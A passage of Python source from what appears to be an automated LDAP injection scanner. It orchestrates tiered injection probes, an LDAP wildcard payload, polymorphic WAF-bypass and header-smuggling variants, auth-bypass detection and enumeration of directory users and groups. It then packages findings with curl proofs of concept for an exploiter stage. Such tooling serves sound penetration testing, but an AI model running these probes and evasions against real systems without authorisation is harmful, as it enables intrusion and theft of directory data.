            framework   = framework,
            context     = ep.context_type,
            survived    = self._client._survived_chars,
            failed      = self._memory.failed_payloads,
            limit       = payload_limit,
        )

        # V6 Enhancement 5: Prepend schema-aware payloads for confirmed injectable endpoints
        ep_key = ep.key
        if (ep_key not in self._schema_cache
                and self._schema_probe
                and self._cfg.schema_probe_enabled
                and t0_signals_fired):
            try:
                schema_report = self._schema_probe.discover(ep, param, baseline, server_type)
                self._schema_cache[ep_key] = schema_report
                schema_payloads = schema_report.get("payloads", [])
                if schema_payloads:
                    payloads = schema_payloads + payloads  # schema payloads go first
                    verbose(f"  [Schema] Injected {len(schema_payloads)} schema-aware payloads for {ep.url}:{param}")
            except Exception as exc:
                verbose(f"  [Schema] Discovery failed: {exc}")

        # V6 Enhancement 3: Inject chained payloads from state tracker
        if self._state_tracker:
            extracted = self._state_tracker.get_extracted()
            if extracted:
                chain_pls = self._state_tracker.build_chained_payloads(extracted, server_type)
                if chain_pls:
                    payloads = chain_pls + payloads
                    verbose(f"  [State] Injected {len(chain_pls)} chained payloads from extracted values")

        payloads = self._memory.sort_by_score(ep.url, payloads)

        found: List[HandoffFinding] = []
        inconclusives: List[InconclusiveFinding] = []
        secondary_sweep: List[Payload] = []
        waf_triggered = False

        consecutive_blocks = 0
        for pl in payloads:
            if self._memory.should_skip(pl.raw):
                continue

            # Circuit Breaker
            if consecutive_blocks >= 5:
                warn(f"Circuit breaker tripped for {ep.url} (5+ consecutive blocks) — skipping endpoint")
                self._logger.log_error(f"circuit_breaker:{ep.key}", "5+ consecutive 403/429")
                break
            if not self._budget.acquire_injection():
                break

            data = build_injection_data(ep, param, pl.raw, self._cfg.deterministic_suffix)
            resp = self._client.send_endpoint(ep, data, phase="injection")
            if resp is None: continue

            # Circuit breaker tracking
            if resp.status_code in (403, 406, 429):
                consecutive_blocks += 1
            else:
                consecutive_blocks = 0

            # OOB check
            oob_hit = bool(self._oob and self._oob.triggered() and pl.tier == PayloadTier.TIER4_OOB)

            result = self._pipeline.run(resp, baseline, pl, oob_triggered=oob_hit)

            # Auth redirect detection
            if not result.fired and ep.is_auth_ep:
                resp_nf = self._client.post(ep.url, data=data, auth_state=ep.auth_state,
                                            phase="injection", follow_redirects=False)
                if resp_nf and resp_nf.status_code in (301, 302, 303, 307, 308):
                    loc = resp_nf.headers.get("Location", "")
                    result = DetectionResult(
                        fired=True, score=4.5, signals=[DetectionSignal(detector="ClassTransition", score=4.5, indicator="Auth redirect")],
                        severity=Severity.HIGH, evidence=f"Redirect to {loc}", has_auth_bypass=True)
                    resp = resp_nf

            if not result.fired:
                self._memory.mark_failure(ep.url, pl.raw)
                if resp.status_code in (403, 406, 429): waf_triggered = True
                continue

            # Signal fired: verified processing
            res_found = self._handle_signal(
                ep=ep, param=param, payload=pl, baseline=baseline,
                result=result, resp=resp, server_type=server_type, framework=framework)
            found.extend(res_found)

            # V6 Enhancement 3: Record confirmed injections in state tracker
            if self._state_tracker and any(
                    f.verification_grade == VerificationGrade.CONFIRMED.value for f in res_found):
                cookies = {c.name: c.value for c in resp.cookies}
                csrf = self._client.csrf_manager.get_tokens()
                marker = self._state_tracker.record_injection(
                    ep, param, pl.raw, pl.technique, cookies, csrf)
                verbose(f"  [State] Recorded confirmed injection marker={marker}")

            # V6 Enhancement 4: Polymorphic WAF bypass generation
            if waf_triggered or self._client.waf_detected:
                # Use PolymorphicPayloadGenerator for richer bypass variants
                poly_variants = self._poly_gen.generate(
                    pl,
                    self._client._survived_chars,
                    waf_name=self._client.waf_name or "Generic",
                    rounds=8,
                )
                # Also include classic Tier3 for backward compatibility
                t3 = PayloadEngine.build_tier3_waf(pl, self._client._survived_chars)
                secondary_sweep.extend(poly_variants)
                secondary_sweep.extend(t3)
                verbose(f"  [WAF] Queued {len(poly_variants)} poly + {len(t3)} T3 bypass variants")

            # Emit InconclusiveFinding when WAF blocks confirmations
            if result.fired and not res_found and self._client.waf_detected:
                # Generate header injection recommendations from poly generator
                header_hints = list(PolymorphicPayloadGenerator.header_injection_variants(pl.raw).keys())
                inconclusive = InconclusiveFinding(
                    endpoint_url   = ep.url,
                    parameter_name = param,
                    signal_fired   = result.signals[0].detector if result.signals else "unknown",
                    reason         = f"WAF ({self._client.waf_name}) blocked all confirmation payloads",
                    payloads_tried = [pl.raw],
                    recommendation = (
                        f"Manual verification: inject {pl.raw!r} via Burp Suite "
                        f"with WAF bypass encoding. Target: {ep.url} param: {param}. "
                        f"Also try header injection via: {', '.join(header_hints[:3])}"
                    ),
                )
                inconclusives.append(inconclusive)

            # Circuit breaker
            if any(f.verification_grade == VerificationGrade.CONFIRMED.value for f in res_found):
                break

        # Phase 2: Secondary Sweep for WAF bypasses
        for pl in secondary_sweep:
            if not self._budget.acquire_injection(): break
            data = build_injection_data(ep, param, pl.raw, self._cfg.deterministic_suffix)
            resp = self._client.send_endpoint(ep, data, phase="injection")
            if resp is None: continue
            result = self._pipeline.run(resp, baseline, pl)
            if result.fired:
                found.extend(self._handle_signal(ep, param, pl, baseline, result, resp,
                                                  is_header=False, server_type=server_type,
                                                  framework=framework))
                if any(f.verification_grade == VerificationGrade.CONFIRMED.value for f in found):
                    break

        # Tier 5 escalation — only when T0 signalled
        if not found and t0_signals_fired:
            mutations = PayloadEngine.build_tier5_mutated(payloads[:3])
            mutation_validated = 0
            for pl in mutations:
                if not self._budget.acquire_injection():
                    break

                data = build_injection_data(ep, param, pl.raw, self._cfg.deterministic_suffix)
                resp = self._client.send_endpoint(ep, data, phase="injection")
                if resp is None:
                    continue

                result = self._pipeline.run(resp, baseline, pl)
                if not result.fired:
                    self._memory.mark_failure(ep.url, pl.raw)
                    continue

                validated = self._handle_signal(
                    ep=ep, param=param, payload=pl, baseline=baseline,
                    result=result, resp=resp,
                    is_header=False, server_type=server_type,
                    framework=framework)

                if not validated:
                    continue

                mutation_validated += len(validated)
                found.extend(validated)
                info(f"    Mutation success! {pl.technique} bypass found and validated")

                if any(f.verification_grade == VerificationGrade.CONFIRMED.value for f in validated):
                    break
                if mutation_validated >= 2:
                    break

        # V12: DynamicPayloadRefiner — escalate if only partial signals seen
        if not found and t0_signals_fired and self._dpr:
            # Build a synthetic partial result from T0 to seed the refiner
            partial = DetectionResult(
                fired=True, score=2.0, signals=[],
                severity=Severity.LOW, evidence="t0_partial")
            dpr_pl, dpr_result = self._dpr.refine(ep, param, baseline, partial)
            if dpr_pl and dpr_result:
                dpr_found = self._handle_signal(
                    ep=ep, param=param, payload=dpr_pl,
                    baseline=baseline, result=dpr_result,
                    resp=None, server_type=server_type, framework=framework)
                if dpr_found:
                    found.extend(dpr_found)
                    info(f"    [DPR] Escalation success: {dpr_pl.technique}")

        return found, inconclusives

    def _run_tier2_boolean(
        self, ep: Endpoint, param: str,
        baseline: Baseline
    ) -> Optional[HandoffFinding]:
        """
        Run Tier 2 paired boolean probes with Median-of-3 statistical confirmation (v3.0).
        Returns HandoffFinding only if TRUE/FALSE differential is stable and confirmed.
        """
        t2_payloads = PayloadEngine.build_tier2(
            context  = ep.context_type,
            survived = self._client._survived_chars,
        )
        true_pl  = next((p for p in t2_payloads if p.technique == "bool_true"), None)
        false_pl = next((p for p in t2_payloads if p.technique == "bool_false"), None)
        
        if not true_pl or not false_pl:
            return None

        true_bodies:  List[str] = []
        false_bodies: List[str] = []

        # Median-of-3 sampling for stability
        for pl_template, collection in [(true_pl, true_bodies), (false_pl, false_bodies)]:
            for _ in range(3):
                if not self._budget.acquire_injection(): break
                data = build_injection_data(ep, param, pl_template.raw, self._cfg.deterministic_suffix)
                resp = self._client.send_endpoint(ep, data, phase="injection")
                if resp: collection.append(resp.text or "")

        if len(true_bodies) < 2 or len(false_bodies) < 2:
            return None

        # 1. Compute intra-group variance (stability check)
        t_intra = [sim_delta(true_bodies[i], true_bodies[j]) for i in range(len(true_bodies)) for j in range(i+1, len(true_bodies))]
        f_intra = [sim_delta(false_bodies[i], false_bodies[j]) for i in range(len(false_bodies)) for j in range(i+1, len(false_bodies))]
        
        max_intra_noise = max(statistics.median(t_intra) if t_intra else 0.0, 
                              statistics.median(f_intra) if f_intra else 0.0)

        # 2. Compute inter-group differential
        inter_samples = [sim_delta(t, f) for t in true_bodies for f in false_bodies]
        med_inter_delta = statistics.median(inter_samples)

        # 3. Oracle Firing Condition
        # Inter-group delta must exceed intra-group noise by a safety margin
        if med_inter_delta < (max_intra_noise + 0.02) or med_inter_delta < baseline.bool_threshold:
            return None

        # Proceed with confirmation using representatives
        true_body  = true_bodies[0]
        false_body = false_bodies[0]
        d5 = self._pipeline._d5_boolean(true_body, false_body, baseline)
        if not d5:
            return None

        detect_msg(f"  T2 Median-of-3 Oracle confirmed (delta={med_inter_delta:.3f}, noise={max_intra_noise:.3f}): "
                   f"{ep.url}:{param}")
        
        result = DetectionResult(
            fired=True, score=d5.score,
            signals=[d5], severity=Severity.MEDIUM,
            evidence=d5.evidence,
        )
        
        # Verify with universal probe
        v_result = self._verifier.verify(ep, param, "*(|(uid=a*))", baseline)

        return self._build_handoff_finding(
            ep=ep, param=param, pl=true_pl,
            result=result, grade=v_result["grade"],
            v_result=v_result,
            server_type="generic", framework="generic",
            inj_body=true_body,
        )

    def _run_tier6_second_order(
        self, ep: Endpoint, param: str,
        baseline: Baseline
    ) -> List[HandoffFinding]:
        """
        Marker injection for second-order reflections (OE2 fix).
        Injects, waits for configurable delay, then probes for reflection.
        """
        uid = uuid.uuid4().hex[:6]
        payloads = PayloadEngine.build_tier6_second_order(uid)
        found: List[HandoffFinding] = []
        
        for pl in payloads:
            if not self._budget.acquire_injection(): break
            
            # Step 1: Trigger Injection
            data = build_injection_data(ep, param, pl.raw, self._cfg.deterministic_suffix)
            self._client.send_endpoint(ep, data, phase="injection")
            
            # Step 2: Wait for background processing (configurable, default 1s not 3s)
            time.sleep(self._cfg.second_order_delay)
            
            # Step 3: Follow-up Probe
            # We re-fetch the baseline (wildcard) to see if marker is now in the filter
            resp = self._client.send_endpoint(ep, build_injection_data(ep, param, "*", self._cfg.deterministic_suffix), phase="injection")
            if resp is None: continue
            
            # Step 4: Detection
            body = resp.text or ""
            marker = f"HELLHOUND_{uid}"
            if marker in body:
                refl_in_filter = LDAP_FILTER_REFLECT_RE.search(body)
                if refl_in_filter or LDAP_ERRORS_RE.search(body):
                    detect_msg(f"  T6 Second-order reflection confirmed: {ep.url}:{param}")
                    result = DetectionResult(
                        fired=True, score=3.0,
                        signals=[DetectionSignal("SecondOrder", 3.0, "Marker reflected in unsafe context", marker)],
                        severity=Severity.HIGH,
                        evidence=f"Marker {marker} detected in second-order reflection",  # FIXED: Added missing evidence
                    )
                    v_res = self._verifier.verify(ep, param, "*", baseline)
                    found.append(self._build_handoff_finding(
                        ep, param, pl, result, v_res["grade"], v_res, "generic", "generic", body
                    ))
                    break # One success per param is enough
        return found

    def _build_handoff_finding(
        self, ep: Endpoint, param: str,
        pl: Payload, result: DetectionResult,
        grade: VerificationGrade,
        v_result: Dict[str, Any],
        server_type: str, framework: str,
        inj_body: str = "",
    ) -> HandoffFinding:
        sev, sev_reason = severity_from_score(
            result.score,
            result.has_auth_bypass,
            result.has_error,
        )
        if grade == VerificationGrade.CONFIRMED:
            if sev.value < Severity.MEDIUM.value:
                sev = Severity.MEDIUM
                sev_reason += " (grade-lifted)"

        # ── Fix: correct diff_ratio ──────────────────────────────────────────
        bl            = self._baselines.get(ep.key)
        diff_ratio    = sim_delta(bl.body, inj_body) if (bl and inj_body) else 0.0
        bl_resp_class = (bl.response_class if bl else ResponseClass.STATIC.value)

        # Extract LDAP markers
        error_snippet: Optional[str] = None
        filter_refl:   Optional[str] = None
        t_zscore:      Optional[float] = None
        t_delta:       Optional[float] = None

        for sig in result.signals:
            if sig.detector == "LDAPError":
                error_snippet = sig.evidence[:100]
            elif sig.detector == "FilterReflection":
                filter_refl = sig.evidence[:100]
            elif sig.detector == "TimingOracle":
                m = re.search(r"z=([\d.]+)", sig.evidence)
                if m: t_zscore = float(m.group(1))
                m2 = re.search(r"t=([\d.]+)", sig.evidence)
                if m2: t_delta = float(m2.group(1)) * 1000

        # Map severity to CVSS (v3.0)
        cvss_vec, cvss_score = assign_cvss(
            sev.name, pl.technique, 
            ep.auth_state == AuthState.AUTH, 
            result.has_auth_bypass
        )

        # Build context
        raw_req = build_raw_request(ep, param, pl.raw)
        expl_ctx = {
            "session_context": {"cookies": self._cfg.cookies, "headers": self._cfg.extra_headers},
            "csrf_tokens": self._client.csrf_manager.get_tokens(),
            "raw_request_hash": hashlib.sha256(raw_req.encode()).hexdigest(),
            "reproducer_steps": [
                f"1. Navigate to {ep.url}",
                f"2. Inject payload {pl.raw!r} into parameter {param}",
                f"3. Observe {result.indicator if hasattr(result, 'indicator') else result.evidence}"
            ],
            "alternative_payloads": [], # populated by caller
        }

        return HandoffFinding(
            finding_id              = finding_id(),
            scan_id                 = self._cfg.scan_id,
            timestamp               = now_iso(),
            endpoint_url            = ep.url,
            http_method             = ep.method.upper(),
            parameter_name          = param,
            auth_state              = ep.auth_state.value,
            payload_raw             = pl.raw,
            payload_encoding        = "raw",
            payload_technique       = pl.technique,
            payload_tier            = pl.tier.name,
            verification_grade      = grade.value,
            verification_steps      = v_result.get("proof", []),
            reproduction_confidence = v_result.get("confidence", 0),
            severity                = sev.name,
            severity_reason         = sev_reason,
            baseline_response_class = bl_resp_class,
            injected_response_class = result.response_class,
            detection_signals       = [s.detector for s in result.signals],
            diff_ratio              = round(diff_ratio, 4),
            timing_zscore           = t_zscore,
            timing_delta_ms         = t_delta,
            ldap_error_snippet      = error_snippet,
            filter_reflection       = filter_refl,
            oob_triggered           = (pl.tier == PayloadTier.TIER4_OOB and result.fired),
            curl_poc                = build_curl_poc(
                ep, param, pl.raw,
                cookies=self._client.session_cookies,
                extra_headers=self._cfg.extra_headers or None,
            ),
            raw_http_request        = raw_req,
            ldap_server_type        = server_type,
            framework_detected      = framework,
            waf_detected            = self._client.waf_detected,
            survived_metacharacters = sorted(self._client._survived_chars),
            cvss_vector             = cvss_vec,
            cvss_score              = cvss_score,
            remediation_guidance    = get_remediation(framework),
            exploiter_context       = expl_ctx,
            non_destructive_confirmed = result.non_destructive_confirmed,
            second_order            = result.second_order,
            affected_ldap_attributes = [],
            schema_enumerated       = False,
        )

    def scan_endpoint(
        self, ep: Endpoint,
        server_type: str = "generic",
        framework:   str = "generic",
    ) -> Tuple[List[HandoffFinding], List[InconclusiveFinding]]:
        """
        Full injection scan for one endpoint.
        Returns Tuple of (findings, inconclusives).
        """
        baseline = self._get_baseline(ep)
        if baseline is None:
            verbose(f"  No baseline for {ep.key} — skipping")
            return ([], [])  # FIXED: Return tuple instead of empty list

        # Wave 3: Tier 0 gate across ALL params (§4.2)
        # We sweep every param with a Tier 0 probe first.
        # This prevents missing signals in multi-param endpoints while saving budget.
        all_found: List[HandoffFinding] = []
        qualified_params: List[Tuple[str, Optional[DetectionResult]]] = []  # FIXED: Allow Optional[DetectionResult]

        if not self._cfg.force_scan:
            for param in ep.params[:12]:
                hit, res = self._run_tier0_for_param(ep, param, baseline)
                if hit and res:
                    qualified_params.append((param, res))
            
            if not qualified_params:
                verbose(f"  T0 gate: no signal across {len(ep.params)} params at {ep.url} — skipping")
                return ([], [])  # FIXED: Return tuple instead of empty list
        else:
            # Force scan: all params qualify
            qualified_params = [(p, None) for p in ep.params[:12]]

        # Wave 4: Header Injection Loop (§7.6, 9)
        # We only run this if endpoint is already qualified or force_scan is on
        header_qualified: List[Tuple[str, DetectionResult]] = []
        if qualified_params or self._cfg.force_scan:
            for hname in LDAP_HEADERS:
                hit, res = self._run_tier0_for_header(ep, hname, baseline)
                if hit and res:
                    header_qualified.append((hname, res))
        
        all_inconclusives: List[InconclusiveFinding] = []

        # 1. Full Tier 1 injection for qualified params
        for param, t0_res in qualified_params:
            t1_found, t1_inc = self._run_tier1_param(
                ep=ep, param=param, baseline=baseline,
                server_type=server_type, framework=framework,
                t0_signals_fired=(t0_res is not None))
            all_found.extend(t1_found)
            all_inconclusives.extend(t1_inc)

            # V11 — Cross-parameter validation on CONFIRMED findings
            confirmed_here = [f for f in t1_found
                              if f.verification_grade == VerificationGrade.CONFIRMED.value]
            if confirmed_here and len(ep.params) > 1:
                for cf in confirmed_here:
                    cpv = self._cross_param_val.validate(
                        ep=ep, trigger_param=param,
                        trigger_payload=cf.payload_raw,
                        baseline=baseline, pipeline=self._pipeline,
                        budget=self._budget)
                    if cpv["cross_param_confirmed"]:
                        cf.reproduction_confidence = min(
                            100, cf.reproduction_confidence + cpv["confidence_boost"])
                        cf.verification_steps.append(
                            f"cross_param: {len(cpv['sibling_anomalies'])} sibling anomalies confirmed")
                        vprint(f"  [CrossParam] Confirmed via {len(cpv['sibling_anomalies'])} siblings on {ep.url}")

            # V11 — Early exit: once a param is CONFIRMED injectable, skip remaining params
            if (confirmed_here and not self._cfg.force_scan
                    and self._cfg.threads <= 4):
                vprint(f"  [EarlyExit] CONFIRMED on {ep.url}:{param} — skipping {len(qualified_params)-1} remaining params")
                break

            # Tier 2 boolean oracle — only if T1 found no CONFIRMED
            if not any(f.verification_grade == VerificationGrade.CONFIRMED.value for f in t1_found):
                t2_finding = self._run_tier2_boolean(ep, param, baseline)
                if t2_finding:
                    all_found.append(t2_finding)

            # Tier 6 second-order — only on write-like non-auth endpoints
            if not ep.is_auth_ep and ep.method.upper() in ("POST", "PUT", "PATCH"):
                t6_found = self._run_tier6_second_order(ep, param, baseline)
                all_found.extend(t6_found)

            # V6: EMA-guided polymorphic WAF bypass sweep (uses PolymorphicBypassGenerator EMA)
            if self._client.waf_detected and self._cfg.polymorphic_waf:
                last_t1 = PayloadEngine.build_tier1(
                    server_type=server_type, framework=framework,
                    context=ep.context_type,
                    survived=self._client._survived_chars,
                    failed=self._memory.failed_payloads,
                )[:1]
                for base_pl in last_t1:
                    # Use PolymorphicBypassGenerator for EMA-learned depth-chained mutations
                    poly_gen_ema = getattr(self, "_poly_gen_ema", None)
                    if poly_gen_ema is None:
                        break
                    poly_payloads = poly_gen_ema.generate(base_pl, depth=self._cfg.poly_depth, max_variants=6)
                    for pl in poly_payloads:
                        if not self._budget.acquire_for_phase("injection"):
                            break
                        data = build_injection_data(ep, param, pl.raw, self._cfg.deterministic_suffix)
                        resp = self._client.send_endpoint(ep, data, phase="injection")
                        if resp is None:
                            continue
                        result = self._pipeline.run(resp, baseline, pl)
                        if result.fired:
                            poly_gen_ema.mark_success(pl.technique.replace("poly_", ""))
                            all_found.extend(self._handle_signal(
                                ep=ep, param=param, payload=pl, baseline=baseline,
                                result=result, resp=resp,
                                server_type=server_type, framework=framework))
                        else:
                            poly_gen_ema.mark_failure(pl.technique.replace("poly_", ""))

            # V8: ChainedPayloadMutator sweep — deep mutation chains from CP memory
            if (self._chained_mutator is not None
                    and self._client.waf_detected
                    and self._cfg.polymorphic_waf):
                t1_seed = PayloadEngine.build_tier1(
                    server_type=server_type, framework=framework,
                    context=ep.context_type,
                    survived=self._client._survived_chars,
                    failed=self._memory.failed_payloads,
                )[:1]
                for base_pl in t1_seed:
                    mutated_pls = self._chained_mutator.mutate(
                        base_pl,
                        waf_name  = self._client.waf_name,
                        framework = framework,
                    )
                    for pl in mutated_pls:
                        if not self._budget.acquire_for_phase("injection"):
                            break
                        data = build_injection_data(ep, param, pl.raw,
                                                    self._cfg.deterministic_suffix)
                        resp = self._client.send_endpoint(ep, data, phase="injection")
                        if resp is None:
                            continue
                        result = self._pipeline.run(resp, baseline, pl)
                        if result.fired:
                            if self._cp_memory:
                                chain_tag = pl.desc.split("[chain:")[-1].rstrip("]") \
                                            if "[chain:" in pl.desc else "unknown"
                                self._cp_memory.record_encoding(chain_tag, success=True)
                                self._cp_memory.record_payload(pl.raw, success=True)
                            all_found.extend(self._handle_signal(
                                ep=ep, param=param, payload=pl, baseline=baseline,
                                result=result, resp=resp,
                                server_type=server_type, framework=framework))
                        else:
                            if self._cp_memory:
                                self._cp_memory.record_payload(pl.raw, success=False,
                                                               waf_blocked=True)

        # 2. Full Tier 1 injection for qualified headers + header-smuggle variants
        for hname, t0_res in header_qualified:
            t1_found, t1_inc = self._run_tier1_header(
                ep=ep, hname=hname, baseline=baseline,
                server_type=server_type, framework=framework)
            all_found.extend(t1_found)
            all_inconclusives.extend(t1_inc)

            # V6: Header smuggle polymorphic variants
            poly_gen_ema = getattr(self, "_poly_gen_ema", None)
            if poly_gen_ema and self._cfg.polymorphic_waf:
                for base_pl in PayloadEngine.build_tier1(
                    server_type=server_type, framework=framework,
                    context="header", survived=self._client._survived_chars,
                )[:2]:
                    for smug_hdr, smug_pl in poly_gen_ema.generate_header_smuggle(base_pl):
                        if not self._budget.acquire_for_phase("injection"):
                            break
                        resp = self._client.send_header(ep, smug_hdr, smug_pl.raw)
                        if resp is None:
                            continue
                        result = self._pipeline.run(resp, baseline, smug_pl)
                        if result.fired:
                            all_found.extend(self._handle_signal(
                                ep=ep, param=smug_hdr, payload=smug_pl,
                                baseline=baseline, result=result, resp=resp,
                                is_header=True, server_type=server_type,
                                framework=framework))

        # V6: Post-confirm LDAP enumeration (gated on --enumerate / enumerate_schema)
        if self._enum_engine and self._cfg.enumerate_schema:
            confirmed_findings = [
                f for f in all_found
                if f.verification_grade == VerificationGrade.CONFIRMED.value
            ]
            for cf in confirmed_findings[:1]:  # Run on first confirmed per endpoint
                enum_result = self._enum_engine.enumerate(
                    ep, cf.parameter_name, baseline, server_type)
                cf.exploiter_context["enumeration"] = enum_result
                cf.schema_enumerated = bool(
                    any(v for v in enum_result.get("users", {}).values()) or
                    any(v for v in enum_result.get("groups", {}).values()))

        return all_found, all_inconclusives

    def _run_tier0_for_param(
        self, ep: Endpoint, param: str, baseline: Baseline
    ) -> Tuple[bool, Optional[DetectionResult]]:
        """
        Run Tier 0 probes for a specific parameter.
        V7 FIX: Stricter gate — require score >= 3.0 OR 2+ signals to qualify.
        Single weak signal (e.g., minor length diff) no longer escalates to Tier 1.
        This prevents budget waste on dynamic apps with natural response variation.
        """
        t0_results: List[DetectionResult] = []
        for pl in PayloadEngine.build_tier0():
            if self._memory.should_skip(pl.raw):
                continue
            if not self._budget.acquire_for_phase("tier0"):
                break

            data = build_injection_data(ep, param, pl.raw, self._cfg.deterministic_suffix)
            resp = self._client.send_endpoint(ep, data, phase="tier0")
            if resp is None:
                continue
            result = self._pipeline.run(resp, baseline, pl)
            if result.fired:
                t0_results.append(result)

        if not t0_results:
            return False, None

        # V7: Multi-probe aggregation — require strong signal
        best = max(t0_results, key=lambda r: r.score)
        n_fired = len(t0_results)

        # Gate: score >= 3.0 (high-confidence single signal) OR 2+ probes fired
        if best.score >= 3.0 or n_fired >= 2:
            probe(f"  T0 qualified: {ep.url}:{param} score={best.score:.1f} probes_fired={n_fired}")
            return True, best

        verbose(f"  T0 skipped: {ep.url}:{param} score={best.score:.1f} < 3.0, n={n_fired} < 2")
        return False, None

    def _run_tier0_for_header(
        self, ep: Endpoint, hname: str, baseline: Baseline
    ) -> Tuple[bool, Optional[DetectionResult]]:
        """Wave 4: Run Tier 0 probes for a specific header (§7.6)."""
        for pl in PayloadEngine.build_tier0():
            if not self._budget.acquire_for_phase("tier0"):
                return False, None
                                
            resp = self._client.send_header(ep, hname, pl.raw, phase="tier0")
            if resp is None:
                continue
            result = self._pipeline.run(resp, baseline, pl)
            if result.fired:
                probe(f"  T0 Header signal: {ep.url}:{hname} score={result.score:.1f}")
                return True, result
        return False, None

    def _run_tier1_header(
        self, ep: Endpoint, hname: str, baseline: Baseline,
        server_type: str, framework: str
    ) -> Tuple[List[HandoffFinding], List[InconclusiveFinding]]:
        """Wave 4: Run Tier 1 injection for a header (§7.6)."""
        all_found = []
        inconclusives = []
        payloads = PayloadEngine.build_tier1(
            server_type = server_type,
            framework   = framework,
            context     = "header",
            survived    = self._client._survived_chars,
            failed      = self._memory.failed_payloads,
            limit       = self._cfg.max_payloads_tier1, # ← C3.3
        )
        for pl in payloads:
            if not self._budget.acquire_for_phase("injection"):
                break
            
            resp = self._client.send_header(ep, hname, pl.raw)
            if resp is None: continue
            
            result = self._pipeline.run(resp, baseline, pl)
            if result.fired:
                found = self._handle_signal(
                    ep=ep, param=hname, payload=pl,
                    baseline=baseline, result=result,
                    resp=resp, is_header=True)
                all_found.extend(found)
        return all_found, inconclusives

    @property
    def fp_filtered_count(self) -> int:
        return self._fp_count

    @property
    def signals_fired_count(self) -> int:
        return self._sig_count

# ═══════════════════════════════════════════════════════════════════════════════
# §19  PHASE 7 — DEDUPLICATION + JSON HANDOFF + AUDIT LOG
# ═══════════════════════════════════════════════════════════════════════════════

class FindingDeduplicator:
    """
    Cross-thread deduplication.
    V7 FIX: Key is now (url + param + structural_payload_hash) not technique.
    This prevents the same vulnerability from being reported twice just because
    two different technique names (auth_bypass vs or_chain) found it.
    The structural hash normalizes whitespace/case so near-identical payloads group correctly.
    Best-graded variant wins; alternatives stored for exploiter agent.
    """

    _GRADE_ORDER = {
        VerificationGrade.CONFIRMED.value:  4,
        VerificationGrade.PROBABLE.value:   3,
        VerificationGrade.CANDIDATE.value:  2,
        VerificationGrade.REJECTED.value:   1,
    }

    _TECHNIQUE_FAMILIES = {
        "bool_true":   "boolean",
        "bool_false":  "boolean",
        "bool_enum":   "boolean",
        "or_chain":    "bypass",
        "auth_bypass": "bypass",
        "ad_bypass":   "bypass",
        "ol_bypass":   "bypass",
        "null_byte":   "bypass",
        "url_encoded": "bypass",
        "structural":  "probe",
        "syntax":      "probe",
        "wildcard":    "probe",
        "waf_url":     "waf_bypass",
        "waf_hex":     "waf_bypass",
        "oob_referral":"oob",
    }

    @classmethod
    def _family(cls, technique: str) -> str:
        return cls._TECHNIQUE_FAMILIES.get(
            technique, technique.split("_")[0])

    @classmethod
    def _payload_structural_hash(cls, payload_raw: str) -> str:
        """
        V7: Normalize payload to a structural hash for grouping.
        Strips whitespace, lowercases, removes LDAP metachar separators,
        then hashes to 10 chars. Near-identical payloads that only differ
        in case or spacing produce the same hash and are grouped.
        """
        normalized = re.sub(r'[\s]+', '', payload_raw.lower())
        # Keep only structural markers, remove specific values
        structural = re.sub(r'(?<=[=(])[a-z0-9@._\-]{4,}(?=[)&|*])', 'V', normalized)
        return hashlib.md5(structural.encode()).hexdigest()[:10]

    @classmethod
    def _key(cls, f: HandoffFinding) -> str:
        """
        V7 FIX: Key = (method, netloc, path, param, structural_payload_hash)
        Previously used technique family which caused same vuln to report twice
        when two technique names (auth_bypass, or_chain) produced similar payloads.
        """
        p = urlparse(f.endpoint_url)
        payload_hash = cls._payload_structural_hash(f.payload_raw or "")
        return (f"{f.http_method}:"
                f"{p.netloc.lower()}"
                f"{(p.path.rstrip('/') or '/').lower()}"
                f":{f.parameter_name}:{payload_hash}")

    @classmethod
    def dedup(cls,
              findings: List[HandoffFinding]
              ) -> List[HandoffFinding]:
        """Deduplicate and merge findings."""
        groups: Dict[str, List[HandoffFinding]] = {}
        for f in findings:
            k = cls._key(f)
            groups.setdefault(k, []).append(f)

        result: List[HandoffFinding] = []
        for key, group in groups.items():
            # Pick best graded — highest confidence wins ties
            best = max(
                group,
                key=lambda x: (
                    cls._GRADE_ORDER.get(
                        x.verification_grade, 0),
                    x.reproduction_confidence,
                )
            )
            # Collect alternative payloads
            alts = [
                f.payload_raw for f in group
                if f.payload_raw != best.payload_raw
            ][:5]
            best.alternative_payloads = alts

            # Dual-state: if both auth and unauth found
            states = {f.auth_state for f in group}
            if len(states) > 1:
                best.auth_state = AuthState.BOTH.value

            result.append(best)

        # Sort by severity then confidence
        _SEV_ORD = {
            "CRITICAL": 4, "HIGH": 3,
            "MEDIUM": 2, "LOW": 1, "INFO": 0
        }
        result.sort(key=lambda x: (
            -_SEV_ORD.get(x.severity, 0),
            -x.reproduction_confidence,
        ))
        return result


class HandoffSerializer:
    """
    V12 — Structured JSON output matching enterprise handoff format.
    Fields: status, findings[], scan_context, audit_summary.
    Each finding: id, vulnerability_type, category, severity, confidence,
                  target_url, affected_parameter, description, observation,
                  proof_of_concept, remediation, details{method, payload,
                  detection_method, raw_request, raw_response, extracted_data}.
    """

    def __init__(self, cfg: ScanConfig):
        self._cfg = cfg

    # ── Severity/confidence normalizers ───────────────────────────────────────
    @staticmethod
    def _norm_sev(s: str) -> str:
        return s.lower() if s else "medium"

    @staticmethod
    def _norm_conf(score: int) -> str:
        if score >= 80: return "high"
        if score >= 50: return "medium"
        return "low"

    @staticmethod
    def _technique_to_category(tech: str) -> str:
        t = tech.lower()
        if "bypass" in t or "auth" in t: return "authentication_bypass"
        if "bool" in t:                   return "blind_injection"
        if "oob" in t:                    return "out_of_band"
        if "enum" in t:                   return "enumeration"
        if "extract" in t:                return "data_exfiltration"
        return "injection"

    @staticmethod
    def _build_description(f: "HandoffFinding") -> str:
        sev    = f.severity.lower()
        tech   = f.payload_technique
        param  = f.parameter_name
        url    = f.endpoint_url
        impact = f.impact_scenario or ""
        return (f"LDAP injection ({tech}) detected in parameter '{param}' "
                f"at {url}. Severity: {sev}. {impact}").strip()

    @staticmethod
    def _build_observation(f: "HandoffFinding") -> str:
        parts = []
        if f.ldap_error_snippet:
            parts.append(f"LDAP error observed: {f.ldap_error_snippet[:200]}")
        if f.filter_reflection:
            parts.append(f"Filter reflection: {f.filter_reflection[:100]}")
        if f.oob_triggered:
            parts.append("Out-of-band DNS callback confirmed.")
        parts.append(f"Detection signals: {', '.join(f.detection_signals[:4])}.")
        parts.append(f"Verification: {f.verification_grade} "
                     f"(confidence={f.reproduction_confidence}%).")
        if f.diff_ratio:
            parts.append(f"Body diff ratio: {f.diff_ratio:.3f}.")
        return " ".join(parts)

    def _finding_to_v12(self, f: "HandoffFinding", idx: int) -> Dict:
